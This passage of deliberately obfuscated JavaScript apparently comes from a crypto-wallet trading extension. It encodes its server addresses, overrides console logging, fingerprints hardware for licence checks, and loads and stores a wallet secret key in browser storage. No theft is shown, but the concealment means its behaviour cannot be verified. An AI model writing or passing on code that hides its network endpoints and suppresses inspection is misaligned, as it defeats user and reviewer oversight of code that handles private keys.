                  const n = new Uint8Array([
                      81, 238, 36, 239, 57, 207, 8, 217, 112, 223, 4, 200, 120,
                      205, 4, 196, 119, 153, 11, 202, 112, 213, 8, 207,
                    ]),
                    r = -1418872551,
                    o = new Uint8Array(n[e(f)]);
                  for (let t = 0; t < n.length; t++) {
                    const i = 255 & y.WndMd(r, (t % 4) * 8);
                    o[t] = y[e(183)](n[t], i);
                  }
                  t = new TextDecoder()[e(h)](o);
                }
                return t;
              };
            })()(),
            g(u)
          ),
          y[g(c)](C),
          ![])
        );
      } catch (w) {
        let t = "Unknown er" + g(l);
        return (
          w instanceof Error
            ? (t = w.message)
            : typeof w === y.SwAKA
            ? (t = w)
            : w && typeof w === g(d) && (t = JSON.stringify(w)),
          Bg(
            y.jqaOK(
              (function () {
                const t = 253;
                let e;
                return function () {
                  const n = xg;
                  if (!e) {
                    const r = new Uint8Array([
                        83, 238, 36, 239, 59, 207, 8, 217, 114, 223, 4, 200,
                        122, 205, 4, 196, 117, 153, 11, 202, 114, 213, 8, 207,
                        59, 206, 4, 223, 115, 153, 8, 217, 105, 214, 31, 145,
                        59,
                      ]),
                      o = -1418872549,
                      i = new Uint8Array(r.length);
                    for (let e = 0; e < r[n(t)]; e++) {
                      const t = 255 & y.WndMd(o, (e % 4) * 8);
                      i[e] = r[e] ^ t;
                    }
                    e = new TextDecoder().decode(i);
                  }
                  return e;
                };
              })()(),
              t
            ),
            y.YpTkJ
          ),
          ![]
        );
      }
    }
    static initializeRpc(t) {
      return vg.getInstance().connect(t);
    }
    static getConnection() {
      const t = Eg;
      return vg.getInstance()[t([235][0]) + t(239)]();
    }
    static getSDK() {
      return vg[Eg([199][0]) + "e"]().getSDK();
    }
    static [Eg(267) + "nt"]() {
      return vg.getInstance().getClient();
    }
    static isRpcConnected() {
      return vg[Eg([199][0]) + "e"]().isConnected();
    }
    static async callRpc(t, e) {
      const n = vg.getInstance();
      return await n.call(t, e);
    }
    static ["disconnect" + Eg(208)]() {
      const t = Eg;
      vg.getInstance()[t([219][0])]();
    }
    static async getVanity(t) {
      const e = 244,
        n = 217,
        r = 230,
        o = 195,
        i = 227,
        s = 206,
        a = 268,
        u = Eg,
        c = { fsRls: "Unknown error" };
      (c[u(268)] = function (t, e) {
        return t === e;
      }),
        (c.WHjXA = u(e));
      const l = c;
      if (!this[u(n) + "en"]) return null;
      try {
        const e = this.API_BASE + "/getVanity/" + encodeURIComponent(t),
          a = {};
        (a.Authorization = "Bearer " + this[u(n) + "en"]),
          (a["Content-Type"] = "application/json");
        const c = { method: "GET" };
        c.headers = a;
        const l = await fetch(e, c);
        if (!l.ok) return 404 === l.status, null;
        const d = await l[u(r)]();
        return d[u(227)][u(o)] && d[u(227)].vanity ? d[u(i)][u(s)] : null;
      } catch (d) {
        return (
          l.fsRls,
          d instanceof Error
            ? d[u(189)]
            : "string" == typeof d ||
              (d && l[u(a)](typeof d, l.WHjXA) && JSON.stringify(d)),
          null
        );
      }
    }
  };
  (Rg.API_BASE = (function () {
    const t = 253,
      e = 249,
      n = 202,
      r = 223,
      o = 229,
      i = xg,
      s = {};
    (s[i(223)] = "(((.+)+)+)+$"),
      (s.ZaJxL = function (t, e) {
        return t * e;
      });
    const a = s,
      u = (function () {
        const t = 203;
        let e = !![];
        return function (n, r) {
          const o = e
            ? function () {
                if (r) {
                  const e = r[xg(t)](n, arguments);
                  return (r = null), e;
                }
              }
            : function () {};
          return (e = ![]), o;
        };
      })(),
      c = u(this, function () {
        const t = i;
        return c[t(n)]()
          .search(a[t(r)])
          [t(202)]()
          [t(o) + "r"](c)
          [t(240)]("(((.+)+)+)+$");
      });
    let l;
    return (
      c(),
      function () {
        const n = i;
        if (!l) {
          const r = new Uint8Array([
              113, 205, 25, 219, 106, 131, 66, 132, 116, 214, 10, 223, 124, 218,
              5, 133, 125, 220, 27, 132, 120, 201, 4,
            ]),
            o = -1418872551,
            i = new Uint8Array(r.length);
          for (let e = 0; e < r[n(t)]; e++) {
            const t = (o >>> a[n(216)](e % 4, 8)) & 255;
            i[e] = r[e] ^ t;
          }
          l = new TextDecoder()[n(e)](i);
        }
        return l;
      }
    );
  })()()),
    (Rg.API_PUB_KEY = (function () {
      const t = 252,
        e = 228,
        n = 191,
        r = 190,
        o = 194,
        i = 233,
        s = 253,
        a = 184,
        u = 237,
        c = 185,
        l = 253,
        d = 248,
        f = 210,
        h = 202,
        p = 248,
        m = 257,
        g = xg,
        y = {};
      (y[g(255)] = g(t)),
        (y[g(e)] = g(n)),
        (y.eePHw = "table"),
        (y[g(r)] = g(o)),
        (y.IGrYs = function (t, e) {
          return t & e;
        }),
        (y[g(i)] = function (t, e) {
          return t * e;
        });
      const w = y,
        b = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n.apply(e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })();
      let v;
      return (
        b(this, function () {
          const t = g,
            e = function (t, e) {
              return t(e);
            },
            n = '{}.constructor("return this")( )',
            r = (function () {
              const t = xg;
              let r;
              try {
                r = e(Function, t(m) + "nction() " + n + ");")();
              } catch (o) {
                r = window;
              }
              return r;
            })(),
            o = (r[t(237)] = r[t(u)] || {}),
            i = [w.mNzxB, "warn", w.xAjAM, "error", t(c), w.eePHw, w.TryHs];
          for (let s = 0; s < i[t(l)]; s++) {
            const e = b.constructor.prototype[t(d)](b),
              n = i[s],
              r = o[n] || e;
            (e[t(f)] = b.bind(b)), (e.toString = r[t(h)][t(p)](r)), (o[n] = e);
          }
        })(),
        function () {
          const t = g;
          if (!v) {
            const e = new Uint8Array([
                46, 136, 89, 157, 47, 142, 94, 154, 126, 140, 14, 155, 40, 223,
                14, 206, 35, 142, 91, 152, 47, 141, 93, 147, 127, 220, 85, 159,
                127, 137, 89, 200, 120, 216, 89, 159, 43, 221, 91, 201, 46, 136,
                93, 205, 34, 136, 92, 207, 122, 139, 84, 155, 44, 221, 88, 205,
                43, 139, 92, 159, 127, 142, 90, 206,
              ]),
              n = -1418872549,
              r = new Uint8Array(e[t(s)]);
            for (let o = 0; o < e.length; o++) {
              const i = w[t(a)](n >>> w.OKYFl(o % 4, 8), 255);
              r[o] = e[o] ^ i;
            }
            v = new TextDecoder().decode(r);
          }
          return v;
        }
      );
    })()()),
    (Rg.currentToken = null);
  let Og = Rg;
  axiom,
    (function (t) {
      const e = 155,
        n = 151,
        r = 168,
        o = 172,
        i = 162,
        s = 153,
        a = zg,
        u = t();
      for (; []; )
        try {
          if (
            452860 ===
            (-parseInt(a(165)) / 1) * (parseInt(a(141)) / 2) +
              -parseInt(a(e)) / 3 +
              (parseInt(a(n)) / 4) * (parseInt(a(137)) / 5) +
              -parseInt(a(128)) / 6 +
              -parseInt(a(r)) / 7 +
              (-parseInt(a(o)) / 8) * (-parseInt(a(i)) / 9) +
              parseInt(a(s)) / 10
          )
            break;
          u.push(u.shift());
        } catch (c) {
          u.push(u.shift());
        }
    })(Ug);
  const Mg = (function () {
      let t = !![];
      return function (e, n) {
        const r = 150,
          o = t
            ? function () {
                if (n) {
                  const t = n[zg(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    Lg = Mg(void 0, function () {
      const t = 148,
        e = 154,
        n = zg;
      return Lg[n(136)]()
        .search(n(t) + "+$")
        [n(136)]()
        [n(e) + "r"](Lg)
        .search("(((.+)+)+)+$");
    });
  Lg();
  const Ng = (function () {
      let t = !![];
      return function (e, n) {
        const r = 150,
          o = t
            ? function () {
                if (n) {
                  const t = n[zg(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    Dg = Ng(void 0, function () {
      const t = 158,
        e = 130,
        n = 129,
        r = 166,
        o = 167,
        i = 161,
        s = 169,
        a = 167,
        u = 146,
        c = 147,
        l = 145,
        d = 133,
        f = zg,
        h = {};
      (h[f(157)] = function (t, e) {
        return t + e;
      }),
        (h.ewQLV = f(t) + f(e)),
        (h.SmvMU = '{}.constructor("retu' + f(n) + " )"),
        (h[f(r)] = f(142)),
        (h[f(o)] = f(i)),
        (h[f(s)] = "table"),
        (h.tdajZ = "trace"),
        (h.ygTYK = function (t, e) {
          return t < e;
        });
      const p = h,
        m = (function () {
          const t = f;
          let e;
          try {
            e = Function(p[t(157)](p[t(d)] + p.SmvMU, ");"))();
          } catch (n) {
            e = window;
          }
          return e;
        })(),
        g = (m.console = m.console || {}),
        y = ["log", "warn", "info", p[f(r)], p[f(a)], p.XkYYN, p[f(u)]];
      for (let w = 0; p[f(135)](w, y[f(164)]); w++) {
        const t = Ng.constructor[f(c)].bind(Ng),
          e = y[w],
          n = g[e] || t;
        (t.__proto__ = Ng[f(l)](Ng)),
          (t.toString = n.toString.bind(n)),
          (g[e] = t);
      }
    });
  function Ug() {
    const t = [
      "yMLUza",
      "DgrHALO",
      "ChjVDg90ExbL",
      "kcGOlISPkYKRkq",
      "ALj2zLO",
      "yxbWBhK",
      "odu0ota4rNzewfHd",
      "AgfZAdO",
      "mti4ndy0mJbuC0rJse8",
      "y29UC3rYDwn0BW",
      "mJm5ntj1rNnNs0e",
      "Dw5RBM93BG",
      "uuPAA0m",
      "CMv0DxjUicHMDq",
      "x2LUzM8",
      "BMn1CNjLBMn5",
      "zxHJzxb0Aw9U",
      "mJiXntHhzePduw4",
      "vu5nqvnlrurFuG",
      "BgvUz3rO",
      "otu2nKvdyuHJtq",
      "EeHHsxu",
      "u25Vrva",
      "nteWmJq2munMweT2Dq",
      "wgTzwu4",
      "CM91BMq",
      "y1jbv0e",
      "mtaXnNHkCNjPEa",
      "BgfUz3vHz2u",
      "uxzRAvi",
      "ru5ervjfuL9xrq",
      "mJmXmJqWnLLPv3H1vW",
      "CM4GDgHPCYiPka",
      "BMn0Aw9UkcKG",
      "AgfYzhDHCMvdBW",
      "uwDnBfm",
      "zxDrtfy",
      "D3bSrMS",
      "EwDuwuS",
      "Dg9tDhjPBMC",
      "mtbssxftq1C",
      "rNj4r2G",
      "v0vcr0XFzgvIDq",
      "y3jLyxrLrwXLBq",
      "otrdtxfJvxK",
      "zxjYB3i",
      "z2v0rxH0zw5ZAq",
      "qKDm",
    ];
    return (Ug = function () {
      return t;
    })();
  }
  Dg(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const qg = () => {
      const t = 134,
        e = 143,
        n = 139,
        r = 127,
        o = zg,
        i = { wplFk: "webgl" },
        s = i,
        a = document[o(140) + "ent"]("canvas").getContext(s[o(t)]),
        u = a[o(e) + "on"](o(n) + "g_renderer" + o(159));
      return a.getParameter(u[o(163) + o(r) + o(144)]);
    },
    Wg = (t) => {
      const e = 136,
        n = zg,
        r = ((t, e = 0) => {
          const n = 174,
            r = 171,
            o = 170,
            i = 164,
            s = 149,
            a = 138,
            u = zg,
            c = {};
          (c[u(132)] = function (t, e) {
            return t + e;
          }),
            (c[u(n)] = function (t, e) {
              return t !== e;
            }),
            (c[u(r)] = function (t, e) {
              return t + e;
            }),
            (c.jRvfZ = function (t, e) {
              return t >>> e;
            }),
            (c.zenAv = function (t, e) {
              return t << e;
            }),
            (c.FrxGh = function (t, e) {
              return t < e;
            });
          const l = c;
          if (!t) return 0;
          let d;
          d = "string" == typeof t ? new TextEncoder().encode(t) : t;
          let f = 1431655765,
            h = l.QgMlS(e, Math[u(o)](0.15 * e)),
            p = 0;
          if (0 === h)
            for (; p < d[u(i)] && l.QvkiR(d[p], 0); )
              (f = (l.cRAWA(l[u(s)](f, 27), l.zenAv(f, 5)) + d[p]) >>> 0), p++;
          else
            for (let m = 0; l[u(a)](m, h); m++) {
              const t = p < d[u(164)] ? d[p] : 0;
              (f = l.jRvfZ(l.QgMlS((f >>> 27) + (f << 5), t), 0)), p++;
            }
          return f;
        })(t, t[n(164)] + 1);
      return [
        function (t, e) {
          return t(e);
        },
      ][0](btoa, r[n(e)]()).substring(0, 20);
    };
  function zg(t, e) {
    const n = Ug();
    return (
      (zg = function (e, r) {
        let o = n[(e -= 127)];
        if (void 0 === zg.ZvZTtc) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (zg.ZWAacg = i), (t = arguments), (zg.ZvZTtc = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.JLRFTk = t),
              (this.RwSEWK = [1, 0, 0]),
              (this.GQbxSf = function () {
                return "newState";
              }),
              (this.GANmun = "\\w+ *\\(\\) *{\\w+ *"),
              (this.zeMrvJ = "['|\"].+['|\"];? *}");
          };
          (e.prototype.ogdWIb = function () {
            const t = new RegExp(this.GANmun + this.zeMrvJ).test(
              this.GQbxSf.toString()
            )
              ? --this.RwSEWK[1]
              : --this.RwSEWK[0];
            return this.Appiil(t);
          }),
            (e.prototype.Appiil = function (t) {
              return Boolean(~t) ? this.BwWGbj(this.JLRFTk) : t;
            }),
            (e.prototype.BwWGbj = function (t) {
              for (let e = 0, n = this.RwSEWK.length; e < n; e++)
                this.RwSEWK.push(Math.round(Math.random())),
                  (n = this.RwSEWK.length);
              return t(this.RwSEWK[0]);
            }),
            new e(zg).ogdWIb(),
            (o = zg.ZWAacg(o)),
            (t[s] = o);
        }
        return o;
      }),
      zg(t, e)
    );
  }
  axiom;
  const Kg = Qg;
  !(function (t) {
    const e = 260,
      n = 210,
      r = 148,
      o = 256,
      i = 254,
      s = 189,
      a = 165,
      u = 236,
      c = 187,
      l = Qg,
      d = t();
    for (; []; )
      try {
        if (
          861689 ===
          -parseInt(l(e)) / 1 +
            (parseInt(l(n)) / 2) * (parseInt(l(r)) / 3) +
            parseInt(l(o)) / 4 +
            (-parseInt(l(i)) / 5) * (parseInt(l(s)) / 6) +
            -parseInt(l(a)) / 7 +
            parseInt(l(u)) / 8 +
            parseInt(l(c)) / 9
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(Hg);
  const Fg = (function () {
      let t = !![];
      return function (e, n) {
        const r = 274,
          o = t
            ? function () {
                if (n) {
                  const t = n[Qg(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    jg = Fg(void 0, function () {
      const t = 213,
        e = 185,
        n = Qg,
        r = {};
      r[n(213)] = "(((.+)+)+)+$";
      const o = r;
      return jg
        .toString()
        .search(o[n(t)])
        .toString()
        .constructor(jg)
        [n(e)]("(((.+)+)+)+$");
    });
  jg();
  const Gg = (function () {
      let t = !![];
      return function (e, n) {
        const r = 274,
          o = t
            ? function () {
                if (n) {
                  const t = n[Qg(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    Vg = Gg(void 0, function () {
      const t = 258,
        e = 138,
        n = 222,
        r = 222,
        o = 250,
        i = 162,
        s = 252,
        a = 221,
        u = 175,
        c = 171,
        l = Qg,
        d = {
          PRpNH: function (t, e) {
            return t(e);
          },
          AYTrL: function (t, e) {
            return t + e;
          },
          izxsB: l(215) + "nction() ",
          wOyrc: "{}.constru" + l(t) + 'rn this")( )',
          VEYgQ: function (t) {
            return t();
          },
          Xqbvt: "warn",
          KTzrw: l(e),
          zsXGd: "exception",
        },
        f = d.VEYgQ(function () {
          const t = l;
          let e;
          try {
            e = d.PRpNH(Function, d.AYTrL(d[t(c)] + d.wOyrc, ");"))();
          } catch (n) {
            e = window;
          }
          return e;
        }),
        h = (f[l(n)] = f[l(r)] || {}),
        p = ["log", d.Xqbvt, d.KTzrw, l(o), d.zsXGd, l(i), l(229)];
      for (let m = 0; m < p.length; m++) {
        const t = Gg[l(s) + "r"][l(a)].bind(Gg),
          e = p[m],
          n = h[e] || t;
        (t.__proto__ = Gg[l(u)](Gg)),
          (t.toString = n.toString.bind(n)),
          (h[e] = t);
      }
    });
  function Hg() {
    const t = [
      "tK1PrhG",
      "tLL6qw8",
      "y3rPB24",
      "zxjZAw9U",
      "t09lB2W",
      "Bg9JywW",
      "BKr2DNK",
      "z2v0uhvIBgLJsW",
      "zw5JB2rL",
      "zgLZy29UBMvJDa",
      "z2v0q29UBMvJDa",
      "zgvMyxvSDfnVBa",
      "z2v0",
      "q29UBMvJDgLVBG",
      "refUBeS",
      "EwrbzvO",
      "Aw5ZDgfUy2u",
      "AgfZvg9Rzw4",
      "mtGZmtaZneLfwgPLtq",
      "B3jHz2u",
      "z2v0qwrKCMvZCW",
      "DM96zMu",
      "BgvyAhe",
      "CMv0DxjUicHMDq",
      "qNfrAK0",
      "CNbJtw9Kzq",
      "DgLJA2vY",
      "z2v0vg9Rzw4",
      "zNjVBufWAvjLCW",
      "ChjVDg90ExbL",
      "y29UC29Szq",
      "q0XoA3C",
      "C2vJCMv0s2v5",
      "C2vUzfjHD1rYyq",
      "AxnwywXPza",
      "C3rYAw5N",
      "B3jKCW",
      "DhjHy2u",
      "AgfZv2fSBgv0",
      "BNnHy3rPB24",
      "z2v0tgf0zxn0vG",
      "Dg9cyxnLntG",
      "Bg93rw5Ktw9Kzq",
      "AgfZs2v5ugfPCG",
      "mti0nZK1mKXAB3njsa",
      "z2v0sw5ZDgfUyW",
      "Aw1WB3j0v2fSBa",
      "CM1mA1C",
      "Bw9NDgvJAf93yq",
      "s2v5",
      "AxnfEhbPCMvK",
      "qMfSyw5Jzq",
      "z2v0qMfSyw5Jzq",
      "C3rVCMfNzq",
      "uhr0B2i",
      "v0DjBM4",
      "ChvIBgLJs2v5",
      "C2v0v2fSBgv0",
      "zxjYB3i",
      "zw5LCG",
      "y29UC3rYDwn0BW",
      "DxnLCM5HBwu",
      "mtbJsNbtwxa",
      "z2v0s2v5ugfPCG",
      "mZu4mdy4ogPXvwDnuW",
      "BgvUz3rO",
      "y3rVCIGICMv0Dq",
      "C3rVCMfNzuXPCW",
      "mtaXndaWmgPKBgfjEG",
      "C2vSzwn0zwrjBq",
      "zw50AwnHDgvK",
      "CM9Y",
      "wK5LD3i",
      "sg9WAfG",
      "wMPICKi",
      "y2fSBfjWyW",
      "Bg9NAw4",
      "y2XLyxjlzxLqyq",
      "B25dAgfUz2vK",
      "z2v0uhjPDMf0zq",
      "D2vIC2L0zvvYBa",
      "A1DqD1G",
      "yxbWBhK",
      "y2XLyw51Ca",
      "qNzeB1e",
      "Cg9UC2u",
      "Aw5MBW",
      "y2XLyxjuB2TLBG",
      "z2v0v2fSBgv0",
      "twHVAxC",
      "vw5RBM93BIbLCG",
      "z2v0uNbJq2XPzq",
      "B2jQzwn0",
      "txnXu0y",
      "ywrKtgLZDgvUzq",
      "u1vJq2W",
      "m0Tky1DYDa",
      "zgvJB2rL",
      "vwX2u3a",
      "DgvUzxi",
      "ywDL",
      "BwvZC2fNzq",
      "C3rYAw5NAwz5",
      "CxvcEfe",
      "C2v0s2v5ugfPCG",
      "zNjVBvnLy3jLDa",
      "ywLY",
      "uvfLrwy",
      "rgnms2C",
      "z2v0qwnJB3vUDa",
      "DgfIBgu",
      "y3vYCMvUDeTLEq",
      "DwjSAwnlzxK",
      "mZCYntqYmwLgu21pvW",
      "DMfSDwu",
      "CMvTB3zLtgLZDa",
      "z2v0v2fSBgv0ua",
      "thDYq1u",
      "Eujkt0y",
      "AxP4C0i",
      "y2f0zwq",
      "y3vYCMvUDfvZzq",
      "DhDPDhrLCLvYBa",
      "yMLUza",
      "ywXHBMnL",
      "Bg9HzezYB21tDa",
      "AxnsCgndB25Uzq",
      "ugfPCG",
      "DhjPBq",
      "Bg9NB3v0",
      "C2f2zvrVu3rVCG",
      "D2fSBgv0s2v5ua",
      "CMvZzxruB0rLzG",
      "C2vHCMnO",
      "CMvTB3zLv2fSBa",
      "mtG1mtu5mJvrAgHNqvC",
      "DgLUz3m",
      "ndG0odm0oen3renwCW",
      "y3vYCMvUDfnLDa",
      "EvbHAxi",
    ];
    return (Hg = function () {
      return t;
    })();
  }
  Vg(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class Xg {
    constructor() {
      const t = 172,
        e = Qg;
      (this[e(173) + "r"] = null), (this["isAuthenti" + e(t)] = ![]);
    }
    static getInstance() {
      const t = 208,
        e = Qg;
      return !Xg[e(t)] && (Xg.instance = new Xg()), Xg[e(t)];
    }
    async authenticateUser(t) {
      const e = 147,
        n = 220,
        r = 137,
        o = 232,
        i = 195,
        s = 242,
        a = 136,
        u = 253,
        l = 180,
        d = 257,
        f = 268,
        h = 173,
        p = 145,
        m = Qg,
        g = {
          KSRri: function (t, e) {
            return t >>> e;
          },
        };
      (g[m(265)] = function (t, e) {
        return t * e;
      }),
        (g.yBJOF = function (t, e) {
          return t ^ e;
        }),
        (g[m(e)] = function (t, e) {
          return t ^ e;
        }),
        (g.tzOSQ = "error"),
        (g[m(136)] = "warning"),
        (g.QXSQZ = function (t, e) {
          return t === e;
        }),
        (g.CwjkO = function (t, e) {
          return t === e;
        }),
        (g.MsqSF = "Unknown error");
      const y = g;
      try {
        const e = c[m(n) + m(r)](t);
        if (!e.isValid)
          return (
            Bg(
              (function () {
                const t = 257;
                let e;
                return function () {
                  const n = Qg;
                  if (!e) {
                    const r = new Uint8Array([
                        36, 226, 233, 191, 1, 229, 251, 254, 24, 255, 250, 172,
                        77, 232, 254, 170, 12, 172, 239, 172, 2, 250, 246, 186,
                        8, 232, 190,
                      ]),
                      o = -559969171,
                      i = new Uint8Array(r.length);
                    for (let e = 0; e < r[n(t)]; e++) {
                      const t = 255 & y.KSRri(o, y.HophX(e % 4, 8));
                      i[e] = y[n(170)](r[e], t);
                    }
                    e = new TextDecoder()[n(149)](i);
                  }
                  return e;
                };
              })()(),
              y.tzOSQ
            ),
            ![]
          );
        if (!(await Og[m(o) + m(i)]())) return ![];
        if (e[m(s)])
          return (
            Bg(
              (function () {
                let t;
                return function () {
                  const e = Qg;
                  if (!t) {
                    const n = new Uint8Array([
                        54, 227, 234, 172, 79, 224, 246, 189, 10, 226, 236, 187,
                        79, 229, 236, 254, 10, 244, 239, 183, 29, 233, 251, 255,
                        79, 222, 250, 176, 10, 251, 191, 167, 0, 249, 237, 254,
                        28, 249, 253, 173, 12, 254, 246, 174, 27, 229, 240, 176,
                        65,
                      ]),
                      r = -559969169,
                      o = new Uint8Array(n.length);
                    for (let t = 0; t < n.length; t++) {
                      const i = (r >>> ((t % 4) * 8)) & 255;
                      o[t] = y[e(147)](n[t], i);
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
              y[m(a)]
            ),
            ![]
          );
        if (!e[m(u)] || !t[m(253)]) return C(), ![];
        const p = (() => {
          const t = 131,
            e = 160,
            n = 152,
            r = 156,
            o = zg,
            i = { altLt: "unknown" },
            s = i,
            a = [];
          a.push("lang:" + navigator[o(173)]),
            a.push("cores:" + (navigator[o(t) + o(e)] || s.altLt)),
            a.push(o(n) + (qg() || o(r)));
          const u = a.join("|");
          return Wg(u);
        })();
        if (!p || y.QXSQZ(p[m(l)]()[m(d)], 0)) return ![];
        if (!(await Og.checkHwid(t[m(u)], p))) return ![];
        const g = await Og[m(f)](t, p);
        return !g || y.CwjkO(g[m(l)]().length, 0)
          ? ![]
          : (Og.initializeRpc(g),
            (this[m(h) + "r"] = e),
            (this["isAuthenti" + m(172)] = !![]),
            !![]);
      } catch (w) {
        return (
          y[m(p)],
          w instanceof Error
            ? w.message
            : "string" == typeof w ||
              (w && typeof w === m(144) && JSON.stringify(w)),
          ![]
        );
      }
    }
    getSDK() {
      return Og.getSDK();
    }
    [Kg(219)]() {
      return Og.getToken();
    }
    [Kg(209)]() {
      return Og.hasToken();
    }
    getCurrentUser() {
      return this.currentUser;
    }
    isUserAuthenticated() {
      var t;
      const e = 173,
        n = 226,
        r = Kg,
        o = {
          NBNqL: function (t, e) {
            return t === e;
          },
        },
        i = o;
      return (
        this.isAuthenticated &&
        i.NBNqL(null == (t = this[r(e) + "r"]) ? void 0 : t[r(n)], !![])
      );
    }
    [Kg(181)]() {
      const t = 139,
        e = Kg;
      Og[e(201) + "Rpc"](),
        Og[e(t)](),
        (this.currentUser = null),
        (this.isAuthenticated = ![]),
        [
          function (t) {
            return t();
          },
        ][0](C);
    }
    isRpcConnected() {
      return Og[Kg([178][0]) + "cted"]();
    }
    [Kg(202) + "ion"]() {
      return Og[Kg([202][0]) + "ion"]();
    }
    async callRpc(t, e) {
      const n = 267,
        r = Kg;
      return this["isUserAuth" + r(262)]() ? await Og[r(n)](t, e) : null;
    }
    async [Kg(161) + Kg(243)](t) {
      const e = Kg,
        n = {};
      n.address = t;
      const r = await this.callRpc("getBalance", n);
      return r ? r[e([166][0])] : null;
    }
    async sendTransaction(t, e) {
      const n = Kg;
      if (!this.isUserAuthenticated()) return null;
      const r = Og.getRpcClient();
      return r ? await r["sendTransa" + n([194][0])](t, e) : null;
    }
    async [Kg(225) + Kg(231)](t, e) {
      const n = 225,
        r = 231,
        o = Kg;
      if (!this.isUserAuthenticated()) return null;
      const i = Og[o(143) + "nt"]();
      return i ? await i[o(n) + o(r)](t, e) : null;
    }
  }
  class Zg {
    constructor() {
      (this.currentSettings = null), this.loadSettings();
    }
    static [Kg(237) + "e"]() {
      return !Zg[Kg([208][0])] && (Zg.instance = new Zg()), Zg.instance;
    }
    loadSettings() {
      const t = Kg;
      (this["currentSet" + t([188][0])] = l.fromStorage()),
        !this.currentSettings && (this[t(190) + t(188)] = l.getDefaults());
    }
    updateSettings(t) {
      const e = 203,
        n = 228,
        r = 217,
        o = 193,
        i = 227,
        s = 196,
        a = Kg,
        u = {
          NYzAo: "Unknown error",
          urmAG: function (t, e) {
            return t === e;
          },
          OOKol: function (t, e) {
            return t === e;
          },
        };
      u[a(155)] = "object";
      const c = u;
      try {
        const o = new l(
          t[a(e)],
          t.priorityFee,
          t.slippage,
          t[a(234)],
          t["highlightW" + a(n)],
          t.apiKey,
          t[a(r)],
          t.selectedMode
        );
        return (
          (this.currentSettings = o), this.currentSettings.saveToStorage(), !![]
        );
      } catch (d) {
        return (
          c[a(o)],
          d instanceof Error
            ? d.message
            : c.urmAG(typeof d, a(i)) ||
              (d && c[a(s)](typeof d, c[a(155)]) && JSON[a(154)](d)),
          ![]
        );
      }
    }
    getSettings() {
      const t = Kg;
      return this[t(190) + t(188)];
    }
    [Kg(184) + "aults"]() {
      const t = 188,
        e = 182,
        n = Kg;
      (this[n(190) + "tings"] = l.getDefaults()),
        this["currentSet" + n(t)][n(e) + "age"]();
    }
  }
  class Jg {
    constructor() {
      const t = 183,
        e = 211,
        n = Kg;
      (this["currentKey" + n(179)] = null),
        (this[n(t) + "air"] = null),
        (this.balance = 0),
        (this.isLoaded = ![]),
        (this.storageListener = null),
        this["loadFromSt" + n(e)]();
    }
    static [Kg(237) + "e"]() {
      const t = Kg;
      return !Jg.instance && (Jg[t([208][0])] = new Jg()), Jg[t(208)];
    }
    async [Kg(177) + Kg(211)]() {
      const t = 142,
        e = 245,
        n = 167,
        r = 259,
        o = 151,
        i = 270,
        s = 146,
        a = 245,
        u = 204,
        c = 240,
        l = 183,
        d = 157,
        f = 192,
        h = 227,
        p = 154,
        m = 158,
        g = 153,
        y = 240,
        w = 241,
        b = 153,
        v = 227,
        A = 154,
        k = 183,
        I = 158,
        S = Kg,
        _ = {};
      (_[S(192)] = S(t) + "ror"),
        (_[S(159)] = function (t, e) {
          return t instanceof e;
        }),
        (_[S(141)] = function (t, e) {
          return t === e;
        });
      const T = _;
      this["storageLis" + S(151)] &&
        chrome[S(e)].onChanged[S(n) + "ener"](this[S(r) + S(o)]),
        (this.storageListener = (t) => {
          const e = S;
          if (t.mogtech_wallet) {
            const r = t[e(y) + "llet"].newValue;
            if (r)
              try {
                const t = Gm.decode(r);
                this.walletKeyPair = Hu["fromSecret" + e(w)](t);
              } catch (n) {
                T[e(192)],
                  T.QQeEf(n, Error)
                    ? n[e(b)]
                    : T.Mhoiw(typeof n, e(v)) ||
                      (n && "object" == typeof n && JSON[e(A)](n)),
                  (this.walletKeyPair = null);
              }
            else this[e(k) + e(I)] = null;
          }
        }),
        chrome[S(e)][S(i)][S(s) + "r"](this.storageListener);
      try {
        const t = await chrome[S(a)].local[S(u)](["mogtech_wallet"]);
        if (t[S(c) + "llet"])
          try {
            const e = Gm.decode(t.mogtech_wallet);
            this[S(l) + S(158)] = Hu[S(d) + "Key"](e);
          } catch (C) {
            T[S(f)],
              C instanceof Error
                ? C.message
                : typeof C === S(h) ||
                  (C && typeof C === S(144) && JSON[S(p)](C)),
              (this[S(183) + S(m)] = null);
          }
        this.isLoaded = !![];
      } catch (B) {
        T.QQeEf(B, Error)
          ? B[S(g)]
          : T.Mhoiw(typeof B, "string") ||
            (B && "object" == typeof B && JSON.stringify(B)),
          (this.isLoaded = !![]);
      }
    }
    async [Kg(182) + "age"]() {
      const t = 216,
        e = 183,
        n = 158,
        r = 223,
        o = 144,
        i = Kg,
        s = {};
      (s[i(223)] = "Unknown error"),
        (s[i(t)] = function (t, e) {
          return t instanceof e;
        });
      const a = s;
      try {
        const t = this[i(e) + i(n)]
            ? Gm.encode(this.walletKeyPair.secretKey)
            : null,
          r = {};
        (r.mogtech_wallet = t), await chrome.storage.local.set(r);
      } catch (u) {
